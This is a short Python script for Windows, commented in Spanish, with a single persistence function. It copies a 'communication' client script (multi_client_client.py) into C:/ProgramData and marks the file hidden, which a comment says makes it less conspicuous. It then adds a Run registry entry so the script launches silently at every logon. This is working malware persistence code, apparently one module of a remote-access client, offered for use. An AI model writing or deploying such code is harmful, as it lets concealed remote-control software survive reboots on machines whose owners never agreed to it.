import winreg
import shutil
import subprocess
import os
"""
FOR WINDOWS

Este script es capaz de crear una entrada en el registro del usuario 
que tiene iniciada la sesión para que se inicie un script en segundo plano
al arrancar windows

es posible que haya que instalar la libreria winreg con pip install (??)
"""
    
def create_persistence(pythonw_path):
    
    script_path = 'C:/ProgramData/multi_client_client.py'
    if os.path.exists('C:/ProgramData') == False:   # si no existe el directorio lo crea
        try:
            os.mkdir('C:/ProgramData')
        except OSError as error:
            pass
        
    if os.path.exists(script_path) == False:
        shutil.copy('./.multi_client_client.py',script_path) #alojamos el script de comunicacion en una ruta de la maquina
        subprocess.call(["attrib", "+H", script_path])  #seteamos el atributo oculto para el script para que sea menos cantoso
   
    # crea una entrada en el registro
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    registry_entry = pythonw_path+" "+script_path
    winreg.SetValueEx(key, "Mi Script", 0, winreg.REG_SZ, registry_entry)
    key.Close()
    
    